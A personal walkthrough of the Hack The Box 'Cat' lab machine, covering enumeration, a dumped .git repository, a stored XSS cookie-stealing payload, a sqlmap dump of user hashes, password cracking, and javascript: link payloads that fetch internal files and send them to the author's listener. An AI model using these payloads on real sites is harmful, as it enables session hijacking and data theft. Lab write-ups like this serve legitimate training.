In this writeup, I’ll be walking through the **Cat** machine from [Hack The Box](https://hackthebox.com), which is rated **Medium** in difficulty. This is the **fifth machine** I’m tackling as part of my journey to reach **1000 points**, and I’m documenting each step to reinforce my learning and help others in the community. The machine involves a mix of enumeration, web exploitation, and privilege escalation.
So lets start!
# Port Enumeration

I will start with scanning the most common ports
```bash
nmap -Pn -sV -F 10.10.11.53 -sC      
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-01 11:56 EDT
Nmap scan report for 10.10.11.53
Host is up (0.36s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://cat.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

I'll perform full port enumeration while taking a closer look at the HTTP service.
```bash
 sudo nmap -sS -Pn -p- 10.10.11.53 -A -n -T5
```
Got nothing new beyond what I found earlier.
## Content Discovery
```bash
ffuf -u http://cat.htb/FUZZ -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -recursion -recursion-depth 3

ffuf -u http://cat.htb/FUZZ -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-small-files.txt -e /.git/ -mc all -fc 404

```
![Whatever Alt Text You Want](/assets/img/attachments/cat-1.png)

As we can see, the `.git` repository is present — let's check if it's accessible.
```bash
curl -s http://cat.htb/.git/HEAD
curl -s http://cat.htb/.git/config
curl -s http://cat.htb/.git/index
curl -s http://cat.htb/.git/logs/HEAD

```
```bash
ref: refs/heads/master
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
0000000000000000000000000000000000000000 8c2c2701eb4e3c9a42162cfb7b681b6166287fd5 Axel <axel2017@gmail.com> 1725146774 +0000       commit (initial): Cat v1
```
Now we will get those files using git_dumper.py
```bash
python3 git_dumper.py http://cat.htb/.git/ ./cat-source
```

We got all application codes, so lets analyze them to find vulnerable injection point

# Gaining Access
![Whatever Alt Text You Want](/assets/img/attachments/cat-3.png)

Those are the parameters that are reflected in the page, and only **admins** can view them (at view_cat.php)

![Whatever Alt Text You Want](/assets/img/attachments/cat-4.png)

At contest.php: 4 parameters out pf five are filtered, but username doesn't

![Whatever Alt Text You Want](/assets/img/attachments/cat-5.png)

And here at join.php we can see that username is added without any checks or validations on the input and also we knew the hashing algorithm used for passwords (md5)
But since username isn't reflected for me and just at view_cat.php I will make admin trigger stored XSS to steal his cookies
```bash
python -m http.server 
```
![Whatever Alt Text You Want](/assets/img/attachments/cat-12.png)

```
<script>
new Image().src = 'https://10.10.16.87/?c=' + document.cookie;
</script>
```

I add a cat and waited

![Whatever Alt Text You Want](/assets/img/attachments/cat-9.png)
I got admin cookie

![Whatever Alt Text You Want](/assets/img/attachments/cat-10.png)

Now we can see admin panel which is accept_cat.php

![Whatever Alt Text You Want](/assets/img/attachments/cat-11.png)

Which is vulnerable to SQLi, so i used sqlmap to dump all tables
```bash
sqlmap -u http://cat.htb/accept_cat.php --data="catId=1&catName=test" --cookie="PHPSESSID=admin php ssid" --level=5 --risk=3 --dbs -p catName --dbms=sqlite --tables --dump -T users --threads 9
```
![Whatever Alt Text You Want](/assets/img/attachments/cat-13.png)
I couldn't crack axel password but was able to get rosa password
```bash
hashcat -m 0 -a 0 d1bbba3670feb9435c9841e46e60ee2f /usr/share/wordlists/rockyou.txt

```

![Whatever Alt Text You Want](/assets/img/attachments/cat-14.png)

I was able to connect to this user by ssh
![Whatever Alt Text You Want](/assets/img/attachments/cat-15.png)
using the same python server on my machine, I downloaded linpeas.sh on victim's machine.

![Whatever Alt Text You Want](/assets/img/attachments/cat-16.png)

After checking this one:
![Whatever Alt Text You Want](/assets/img/attachments/cat-17.png)

using this password i was able to increase my privileges
![Whatever Alt Text You Want](/assets/img/attachments/cat-18.png)
And we got user flag!
# Privilege Escalation
![Whatever Alt Text You Want](/assets/img/attachments/cat-19.png)

Lets check those ports
```bash
ssh -L 3000:127.0.0.1:3000 axel@cat.htb

```
![Whatever Alt Text You Want](/assets/img/attachments/cat-20.png)

I found this website, and i logged in with axel's credentials, and the service version has exploits

![Whatever Alt Text You Want](/assets/img/attachments/cat-21.png)

```js
<a href="javascript:location.href='http://ip:8000?c='+document.cookie">XSS test</a>
```
But didn't work as the previous case where admin visits the page, something is missing

![Whatever Alt Text You Want](/assets/img/attachments/cat-22.png)
Lets check this one!
![Whatever Alt Text You Want](/assets/img/attachments/cat-23.png)

Mail must be sent to jobert, but we can see that this page doesn't have cookie header:
```js
<a href="javascript:alert(document.cookie)">Click me</a>
```
![Whatever Alt Text You Want](/assets/img/attachments/cat-24.png)

**You must upload any file on the created repo to procced!**
I wanted to validate that the admin views the repo as mentioned at the mail
```js
<a href="javascript:fetch('http://10.10.16.87:8000/?ping=1')">Test</a>
```
![Whatever Alt Text You Want](/assets/img/attachments/cat-25.png)

And since  i couldn't access this page : http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md
```js
<a href="javascript:
fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md')
.then(r => r.text())
.then(d => fetch('http://ip:8000/?leak=' + btoa(d)))
">Click me</a>

```
![Whatever Alt Text You Want](/assets/img/attachments/cat-26.png)
nothing important here
```
# Employee Management
Site under construction. Authorized user: admin. No visibility or updates visible to employees.
```

I tried to get the content of the other files at this repo, couldn't list them, but after guessing (trial and error) i got the content of index.php
```js
<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php").then(response=>response.text()).then(data=>fetch("http://10.10.16.87:8000/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS test</a>
```
![Whatever Alt Text You Want](/assets/img/attachments/cat-27.png)

![Whatever Alt Text You Want](/assets/img/attachments/cat-28.png)

I couldn't log in to administrator account with this password but it worked as root password!
![Whatever Alt Text You Want](/assets/img/attachments/cat-29.png)

**And done!**  
That was a tough one — definitely one of the more challenging tasks I've tackled. But every step was a learning opportunity, and I gained a lot of valuable insight along the way. Looking forward to applying these lessons in future challenges!
